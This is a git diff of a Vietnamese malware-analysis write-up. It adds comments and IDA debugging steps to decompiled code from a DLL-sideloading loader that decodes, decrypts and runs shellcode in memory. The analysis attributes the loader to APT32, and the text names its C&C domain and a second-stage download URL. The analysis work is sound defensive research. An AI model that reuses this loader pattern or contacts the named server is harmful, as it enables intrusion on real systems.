@@ -13,13 +13,13 @@ signed int __stdcall sub_30001573(int a1, int a2, int a3, int a4)
   v4 = LoadLibraryW(L"wwlib.dll");
   if ( v4 || (v4 = (HMODULE)sub_30001968(L"{0638C49D-BB8B-4CD1-B191-051E8F325736}")) != 0 )
   {
-    v5 = GetProcAddress(v4, "FMain");
+    v5 = GetProcAddress(v4, "FMain");//Lấy địa chỉ hàm FMain lưu vào biến v5
     dword_30003010 = (int)GetProcAddress(v4, "wdCommandDispatch");
     v6 = GetProcAddress(v4, "wdGetApplicationObject");
     dword_3000300C = (int)v6;
     if ( v5 && dword_30003010 && v6 )
     {
-      ((void (__stdcall *)(int, int, int, int))v5)(a1, a2, a3, a4);
+      ((void (__stdcall *)(int, int, int, int))v5)(a1, a2, a3, a4);//Gọi hàm FMain
       FreeLibrary(v4);
       result = 0;
     }
@@ -37,7 +37,7 @@ signed int __stdcall sub_30001573(int a1, int a2, int a3, int a4)
 }
 ```
 
-Danh sách export của wwlib.dll:
+Thử mở file `wwlib.dll` bằng IDA Pro xem sao, danh sách export của wwlib.dll như này:
 
 ![Screenshot](/img1.png?raw=true "Screenshot")
 
@@ -87,8 +87,16 @@ int FMain()
   return 0;
 }
 ```
+Để có thể debug được file dll này, chúng ta cần chọn đường dẫn Application tới file `word.exe`. Cụ thể thiết lập Process Options như sau:
 
-Từ hàm **FMain**, hàm **sub_6D981040** sẽ được gọi đầu tiên. Hàm này decode 1 chuỗi base64 (đây chính là shellcode của mã độc) và lưu kết quả đã decode vào bộ nhớ.
+![Screenshot](/img10.png?raw=true "Screenshot")
+
+Đặt 1 breakpoint ở hàm FMain và nhấn nút Start Process:
+
+![Screenshot](/img11.png?raw=true "Screenshot")
+
+
+Từ hàm **FMain**, hàm **sub_6D981040** sẽ được gọi đầu tiên.
 
 ```C++
 _DWORD *__fastcall sub_6D981040(_DWORD *a1)
@@ -127,9 +135,9 @@ _DWORD *__fastcall sub_6D981040(_DWORD *a1)
   if ( !v10 )
     a1 = (_DWORD *)*a1;
   *(_BYTE *)a1 = 0;
-  v4 = a6aaaaabzgKfjym;
+  v4 = a6aaaaabzgKfjym;//chuỗi base64 chứa shellcode
   v25 = 0;
-  v19 = a6aaaaabzgKfjym;
+  v19 = a6aaaaabzgKfjym;//chuỗi base64 chứa shellcode
   do
   {
     v5 = *v4;
@@ -198,9 +206,12 @@ trong đó **a6aaaaabzgKfjym** chính là biến lưu chuỗi base64:
 
 ![Screenshot](/img2.png?raw=true "Screenshot")
 
-Tiếp theo nó tiếp tục gọi hàm **sub_6D981660**, nhưng hàm này khá lằng nhằng nên tôi bỏ qua không quan tâm luôn.
+Tóm lại, hàm `sub_6D981040` decode 1 chuỗi base64 (đây chính là shellcode của mã độc) và lưu kết quả đã decode vào 1 vùng nhớ vừa cấp phát và thực thi shellcode.
 
-Sau đó, từ **FMain** hàm **sub_6D981230** được gọi.
+
+Quay lại hàm `FMain`, nó tiếp tục gọi hàm **sub_6D981660**, nhưng hàm này khá lằng nhằng nên tôi bỏ qua không quan tâm luôn 😁😁😁.
+
+Sau đó hàm **sub_6D981230** được gọi.
 
 ```C++
 int __cdecl sub_6D981230(void *lpMem, int a2, int a3, int a4, SIZE_T dwSize, int a6)
@@ -212,13 +223,13 @@ int __cdecl sub_6D981230(void *lpMem, int a2, int a3, int a4, SIZE_T dwSize, int
   unsigned int v10; // eax
   char *v11; // ecx
 
-  v6 = (void (*)(void))VirtualAlloc(0, dwSize, 0x1000u, 0x40u);
+  v6 = (void (*)(void))VirtualAlloc(0, dwSize, 0x1000u, 0x40u);//cấp phát vùng nhớ
   v7 = &lpMem;
   if ( (unsigned int)a6 >= 0x10 )
     v7 = lpMem;
   v8 = v6;
-  memmove_0(v6, v7, dwSize);
-  v8();
+  memmove_0(v6, v7, dwSize);//copy shellcode vào vùng nhớ
+  v8(); //thực thi shellcode (đặt breakpoint tại đây)
   if ( (unsigned int)a6 >= 0x10 )
   {
     v9 = lpMem;
@@ -244,11 +255,11 @@ int __cdecl sub_6D981230(void *lpMem, int a2, int a3, int a4, SIZE_T dwSize, int
 
 Đầu tiên, mã độc gọi hàm **VirtualAlloc** để cấp phát 1 vùng nhớ lưu mã thực thi. Sau đó gọi hàm **memmove_0** để copy dữ liệu base64 đã decode ở trên vào vùng nhớ đó (`v6 -> v8`), cuối cùng mã độc gọi `v8()` để thực thi shellcode.
 
-Tiến hành đặt breakpoint ngay dòng `v8()` và debug, tới breakpoint nhấn **F7**. 
+Tiến hành đặt breakpoint ngay dòng `v8()` và debug, tới breakpoint nhấn **F7** để `Step In` vào shellcode. 
 
 ![Screenshot](/img3.png?raw=true "Screenshot")
 
-Tiếp tục nhấn F8 cho tới đoạn `call    near ptr unk_1A0016`, nhấn F7 -> nhấn P -> nhấn F5, thu được hàm `unk_1A0016` như sau:
+Tiếp tục nhấn F8 cho tới đoạn `call    near ptr unk_1A0016`, nhấn F7 -> nhấn P để tạo function -> nhấn F5 để xem mã giả, thu được hàm `unk_1A0016` như sau:
 
 ```C++
 char __stdcall sub_1A0016(_DWORD *a1)
@@ -612,7 +623,11 @@ LABEL_37:
   }
   while ( v23 );
   v43 = a1;
-  v9 = v135(0, *a1, 12288, 64);
+  v9 = v135(0, *a1, 12288, 64);//kernel32_VirtualAlloc
+  //cấp phát vùng nhớ lưu shellcode bằng hàm VirtualAlloc
+  //cần đặt breakpoint sau hàm này để lấy địa chỉ vùng nhớ
+  //trước khi gọi hàm CreateThread bên dưới, phải đặt
+  //breakpoint ở vùng nhớ này trước
   v44 = v9;
   v77 = v9;
   if ( !v9 )
@@ -752,8 +767,11 @@ LABEL_60:
   {
     if ( v47 == *a1 )
     {
-      v69 = v136(0, 0, v77, 0, 0, 0);
-      v137(v69, -1);
+      //đặt breakpoint tại đây, nhảy vào vùng nhớ đã cấp phát ở trên
+      //Nhấn C để chuyển Data sang Code, đặt breakpoint trước khi
+      //gọi hàm CreateThread và WaitForSingleObject
+      v69 = v136(0, 0, v77, 0, 0, 0);//kernel32_CreateThread
+      v137(v69, -1);//kernel32_WaitForSingleObject
       LOBYTE(v9) = v138(v77, *a1, 0x8000);
     }
   }
@@ -764,17 +782,18 @@ LABEL_60:
   return v9;
 }
 ```
-Có vẻ đoạn chương trình đã bị obfuscate nên khá rối rắm, tuy nhiên chương trình có gọi một số hàm thông qua biến, vì thế chúng ta có thể debug tới những lệnh gọi này và nhấn F7 sẽ biết nó gọi hàm gì:
+Có vẻ đoạn chương trình đã bị obfuscate nên khá rối rắm, tuy nhiên chúng ta chỉ cần chú ý 2 chỗ tôi đã comment.
+Chương trình có gọi một số hàm thông qua biến, vì thế cách đơn giản nhất là debug tới những lệnh gọi này và nhấn F7 sẽ biết nó gọi hàm gì:
 
 ![Screenshot](/img4.png?raw=true "Screenshot")
 
 ![Screenshot](/img5.png?raw=true "Screenshot")
 
--> `v135` chính là địa chỉ của hàm `VirtualAlloc` nằm trong file `kernel32.dll`. 
+-> `v135` chính là địa chỉ của hàm `VirtualAlloc` nằm trong thư viện `kernel32.dll`. 
 
 Sau khi tạo vùng nhớ, mã độc lại copy shellcode mới vào biến `v9`. Bằng cách debug tương tự, chúng ta có thể thấy `v136` là hàm `CreateThread` và `v137` là hàm `WaitForSingleObject`. Vậy có nghĩa là mã độc tạo thread mới gọi tới địa chỉ của shellcode, sau đó gọi hàm `WaitForSingleObject` để chờ thread chạy xong.
 
-Để có thể đặt breakpoint ở shellcode, chúng ta cần dừng chương trình ở ngay lệnh gọi hàm `CreateThread`
+Để có thể đặt breakpoint ở shellcode, chúng ta cần dừng chương trình ở ngay lệnh gọi hàm `CreateThread` (chi tiết xem comment ở trong đoạn đoạn chương trình ở trên).
 
 ![Screenshot](/img6.png?raw=true "Screenshot")
 
@@ -1280,15 +1299,15 @@ LABEL_38:
   v49 = v48 + 17;
   if ( v44[56] != 49 )
     v49 = v48;
-  v116 = (const char *)v161(v49, 1);
-  result = v161(v49, 1);
+  v116 = (const char *)v161(v49, 1);//msvcrt_calloc
+  result = v161(v49, 1);//msvcrt_calloc
   v117 = (const char *)result;
   if ( v116 && result )
   {
     v50 = a1;
     if ( *(_DWORD *)(a1 + 91) )
     {
-      v51 = ((int (__cdecl *)(const char *, int))v162)(v116, a1 + 103);
+      v51 = ((int (__cdecl *)(const char *, int))v162)(v116, a1 + 103);//msvcrt_strlen
       v163((int)&v116[v51]);
     }
     if ( *(_BYTE *)(a1 + 53) == 49 )
@@ -1332,14 +1351,14 @@ LABEL_38:
       v163(v54 + v58);
     }
     v138 = 4;
-    v59 = v166(648);
+    v59 = v166(648);//msvcrt_malloc
     v105 = v59;
-    if ( v181(v59, &v138) == 111 )
+    if ( v181(v59, &v138) == 111 )//iphlpapi_GetAdaptersInfo
     {
-      v105 = v166(v138);
+      v105 = v166(v138);//msvcrt_malloc
       v59 = v105;
     }
-    v60 = v181(v59, &v138);
+    v60 = v181(v59, &v138);//iphlpapi_GetAdaptersInfo
     v61 = 0;
     v113 = v60;
     v110 = 0;
@@ -1502,7 +1521,7 @@ LABEL_38:
           v80 = v117;
           do
           {
-            ((void (__cdecl *)(const char *, const char *))v163)(v80, v116);
+            ((void (__cdecl *)(const char *, const char *))v163)(v80, v116);//msvcrt__mbscpy
             if ( *(_BYTE *)(v73 + 55) == 49 )
             {
               v81 = 0;
@@ -1545,14 +1564,15 @@ LABEL_38:
               v163((int)&v80[v90]);
               v73 = a1;
             }
-            v91 = v161(v75, 1);
+            v91 = v161(v75, 1);//msvcrt_calloc
             if ( v91 )
             {
-              if ( v171(&v141, 0, 0, 24, -268435456) )
+              if ( v171(&v141, 0, 0, 24, -268435456) )//advapi32_CryptAcquireContextW
               {
-                if ( v172(v141, 32780, 0, 0, &v140) )
+                if ( v172(v141, 32780, 0, 0, &v140) )//advapi32_CryptCreateHash
                 {
-                  if ( v173(v140, (unsigned int)v80, strlen(v80), 0) && v174(v141, v108, v140, 0, &v145) )
+                  if ( v173(v140, (unsigned int)v80, strlen(v80), 0) && //advapi32_CryptHashData
+                   v174(v141, v108, v140, 0, &v145) )//advapi32_CryptHashData
                   {
                     v92 = *(_DWORD *)(v73 + 99);
                     v93 = v92 / v102 + 1;
@@ -1560,7 +1580,11 @@ LABEL_38:
                       v93 = *(_DWORD *)(v73 + 99) / v102;
                     v142 = v93;
                     v118 = v102 * v93;
-                    v120 = v155(0, v102 * v93, 12288, 64);
+                    v120 = v155(0, v102 * v93, 12288, 64);//kernel32_VirtualAlloc
+                    //v120 chính là vùng nhớ sẽ chứa shellcode
+                    //cần đặt breakpoint ở sau hàm này để lấy địa chỉ vùng nhớ vừa cấp phát
+                    //trước khi gọi hàm CreateThread, phải nhảy tới địa chỉ vùng nhớ này
+                    //nhấn C để chuyển data sang code và đặt breakpoint
                     if ( v120 )
                     {
                       v94 = v102;
@@ -1583,40 +1607,42 @@ LABEL_38:
                               v112 = (char **)(v98 - v97);
                             }
                           }
-                          v164(v91, a1 + 103 + v97 + *(_DWORD *)(a1 + 91), v94);
-                          if ( !v175(v145, 0, v119, 0, v91, &v112) )
+                          v164(v91, a1 + 103 + v97 + *(_DWORD *)(a1 + 91), v94);//msvcrt_memcpy
+                          if ( !v175(v145, 0, v119, 0, v91, &v112) )//advapi32_CryptDecrypt
                             break;
-                          v164(v97 + v120, v91, (int)v112);
-                          v165(v91, 0, v102);
+                          v164(v97 + v120, v91, (int)v112);//msvcrt_memcpy
+                          v165(v91, 0, v102);//msvcrt_memset
                           v97 += v102;
                           if ( ++v95 >= v142 )
                             break;
                           v94 = (int)v112;
                         }
                       }
-                      if ( v121 || !v171(&v144, 0, 0, 24, -268435456) )
+                      if ( v121 || !v171(&v144, 0, 0, 24, -268435456) )//advapi32_CryptAcquireContextW
                       {
                         v73 = a1;
                       }
                       else
                       {
                         v73 = a1;
-                        if ( v172(v144, 32780, 0, 0, &v139) )
+                        if ( v172(v144, 32780, 0, 0, &v139) )//advapi32_CryptCreateHash
                         {
                           v99 = v120;
-                          if ( v173(v139, v120, *(_DWORD *)(a1 + 95), 0) )
+                          if ( v173(v139, v120, *(_DWORD *)(a1 + 95), 0) )//advapi32_CryptHashData
                           {
                             i = 32;
-                            if ( v179(v139, 2, &v224, &i, 0) )
+                            if ( v179(v139, 2, &v224, &i, 0) )//advapi32_CryptGetHashParam
                             {
-                              if ( v168(&v224, a1 + 58, 32) )
+                              if ( v168(&v224, a1 + 58, 32) )//msvcrt_memcmp
                               {
                                 v158(v99, v118, 0x8000);
                               }
                               else
                               {
-                                v100 = v156(0, 0, v99, 0, 0, 0);
-                                v157(v100, -1);
+                                //tại đây, shellcode sẽ được thực thi ở Thread mới thông qua hàm CreateThread
+                                //nhớ đặt breakpoint ở vùng nhớ cấp phát trước khi cho chạy qua 2 hàm bên dưới
+                                v100 = v156(0, 0, v99, 0, 0, 0);//kernel32_CreateThread
+                                v157(v100, -1);//kernel32_WaitForSingleObject
                                 v121 = 1;
                               }
                             }
@@ -1660,7 +1686,9 @@ LABEL_38:
 }
 ```
 
-Lần này mã độc giải mã shellcode bằng các hàm có sẵn trong thư viện **advapi32.dll**. Cũng bằng cách xác định các hàm bằng debug và đặt breakpoint shellcode như ở trên, chúng ta sẽ thu được shellcode mới 😉😉😉.
+Lần này mã độc giải mã shellcode bằng các hàm Crypto có sẵn trong thư viện **advapi32.dll** để giải mã shellcode.
+
+Tương tự như ở trên, chúng ta chỉ cần tìm các lệnh gọi hàm thông qua biến và đặt breakpoint tại đó (xem chi tiết ở comment) chúng ta sẽ thu được shellcode mới (các hàm đã được rename cho dễ đọc 😉😉😉).
 
 ```C++
 int __stdcall sub_990016(int a1)
@@ -2219,4 +2247,4 @@ Mã độc thực hiện mở kết nối tới domain **suppend.couchpotatofrie
 
 Sau đó gửi request GET tới uri `/mdHu`, tại đây mã độc sẽ download mã thực thi từ url `https://suppend.couchpotatofries.org/mdHu` sau đó thực thi tương tự như các bước trước đã phân tích.
 
-Như vậy, có thể kết luận đây là mã độc tấn công APT có C&C server là suppend.couchpotatofries.org, rất có thể mã độc này có liên quan tới chiến dịch APT32 (OceanLotus).
+Như vậy, có thể kết luận đây là mã độc tấn công APT có C&C server là `suppend.couchpotatofries.org`, rất có thể mã độc này có liên quan tới chiến dịch APT32 (OceanLotus).
